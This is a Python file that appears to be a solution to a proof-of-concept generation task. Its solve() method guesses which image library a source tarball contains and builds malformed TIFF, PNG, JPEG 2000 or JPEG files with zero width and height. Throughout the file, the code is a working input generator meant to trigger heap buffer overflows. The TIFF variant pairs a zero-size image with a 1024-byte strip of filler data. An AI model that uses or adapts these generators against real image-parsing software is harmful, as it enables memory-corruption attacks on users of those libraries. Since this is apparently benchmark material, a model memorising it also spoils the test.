import struct
import tarfile
import os
import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        
        The vulnerability description "zero width or height images are not checked" 
        usually refers to allocation size calculations resulting in 0, followed by 
        a write based on another parameter (Heap Buffer Overflow).
        
        This solver attempts to detect the project from the source tarball and 
        generates the appropriate malformed image.
        """
        project = self._detect_project(src_path)
        
        if project == 'libtiff':
            return self._generate_tiff()
        elif project == 'openjpeg':
            return self._generate_j2k()
        elif project == 'libpng':
            return self._generate_png()
        elif project == 'libjpeg':
            return self._generate_jpeg()
        else:
            # Default to libtiff as it is the most common target for this specific bug description
            return self._generate_tiff()

    def _detect_project(self, src_path):
        try:
            if not os.path.exists(src_path):
                return 'libtiff'
            
            # Check filename hints
            s_lower = src_path.lower()
            if 'tiff' in s_lower: return 'libtiff'
            if 'jp2' in s_lower or 'j2k' in s_lower: return 'openjpeg'
            
            # Inspect tarball contents
            if tarfile.is_tarfile(src_path):
                with tarfile.open(src_path, 'r:*') as tar:
                    for i, m in enumerate(tar):
                        name = m.name.lower()
                        if 'tiff' in name: return 'libtiff'
                        if 'openjpeg' in name or 'openjp2' in name: return 'openjpeg'
                        if 'png' in name: return 'libpng'
                        if 'jpeg' in name or 'jpg' in name: return 'libjpeg'
                        if i > 50: break # Inspect first 50 files only
        except:
            pass
        return 'libtiff'

    def _generate_tiff(self):
        # Generates a TIFF with 0 Width/Height but a valid StripByteCounts pointing to data.
        # This triggers heap overflow if the library allocates (Width*Height) buffer but reads StripByteCounts.
        
        # Header: Little Endian (II), Version 42, Offset 8
        header = b'II\x2a\x00\x08\x00\x00\x00'
        
        entries = []
        pack = struct.pack
        
        # 256 ImageWidth: 0
        entries.append(pack('<HHII', 256, 4, 1, 0))
        # 257 ImageLength: 0
        entries.append(pack('<HHII', 257, 4, 1, 0))
        # 258 BitsPerSample: 8
        entries.append(pack('<HHII', 258, 3, 1, 8))
        # 259 Compression: 1 (None)
        entries.append(pack('<HHII', 259, 3, 1, 1))
        # 262 PhotometricInterpretation: 1 (MinIsBlack)
        entries.append(pack('<HHII', 262, 3, 1, 1))
        # 273 StripOffsets: 200 (Pointer to data)
        entries.append(pack('<HHII', 273, 4, 1, 200))
        # 277 SamplesPerPixel: 1
        entries.append(pack('<HHII', 277, 3, 1, 1))
        # 278 RowsPerStrip: 1
        entries.append(pack('<HHII', 278, 4, 1, 1))
        # 279 StripByteCounts: 1024 (Amount of data to read)
        entries.append(pack('<HHII', 279, 4, 1, 1024))
        
        # IFD Construction
        num_entries = len(entries)
        ifd = pack('<H', num_entries) + b''.join(entries) + b'\x00\x00\x00\x00'
        
        # Padding to offset 200
        current_len = len(header) + len(ifd)
        pad_len = 200 - current_len
        if pad_len < 0: pad_len = 0
        
        # Data payload
        payload = b'A' * 1024
        
        return header + ifd + (b'\x00' * pad_len) + payload

    def _generate_png(self):
        # Generates a PNG with 0 Width/Height
        sig = b'\x89PNG\r\n\x1a\n'
        
        def chunk(tag, data):
            # CRC is strictly required by some parsers
            crc = zlib.crc32(tag + data) & 0xffffffff
            return struct.pack('>I', len(data)) + tag + data + struct.pack('>I', crc)
        
        # IHDR: Width=0, Height=0, Depth=8, Type=2, Comp=0, Filter=0, Interlace=0
        ihdr_data = struct.pack('>IIBBBBB', 0, 0, 8, 2, 0, 0, 0)
        ihdr = chunk(b'IHDR', ihdr_data)
        
        # Empty IDAT
        idat = chunk(b'IDAT', b'')
        
        # IEND
        iend = chunk(b'IEND', b'')
        
        return sig + ihdr + idat + iend

    def _generate_j2k(self):
        # Generates a JPEG 2000 Codestream with 0 Width/Height in SIZ marker
        soc = b'\xff\x4f' # Start of Codestream
        
        # SIZ Marker
        # Caps(2), Xsiz(4), Ysiz(4), XOsiz(4), YOsiz(4), XTsiz(4), YTsiz(4), XTOSiz(4), YTOSiz(4), Csiz(2)
        # Xsiz=0, Ysiz=0
        siz_params = struct.pack('>HIIIIIIIIH', 0, 0, 0, 0, 0, 128, 128, 0, 0, 1)
        # Component info: Ssiz(1)=7, XRsiz(1)=1, YRsiz(1)=1
        siz_params += b'\x07\x01\x01'
        
        siz = b'\xff\x51' + struct.pack('>H', len(siz_params) + 2) + siz_params
        eoc = b'\xff\xd9'
        
        return soc + siz + eoc

    def _generate_jpeg(self):
        # Generates a JPEG with 0 Width/Height in SOF0
        soi = b'\xff\xd8'
        
        # SOF0: Precision(1), Height(2), Width(2), Components(1)
        # Height=0, Width=0
        sof_data = struct.pack('>BHHB', 8, 0, 0, 3)
        # Components: ID, H/V, Quant table ID
        sof_data += b'\x01\x11\x00\x02\x11\x00\x03\x11\x00'
        
        sof = b'\xff\xc0' + struct.pack('>H', len(sof_data) + 2) + sof_data
        eoi = b'\xff\xd9'
        
        return soi + sof + eoi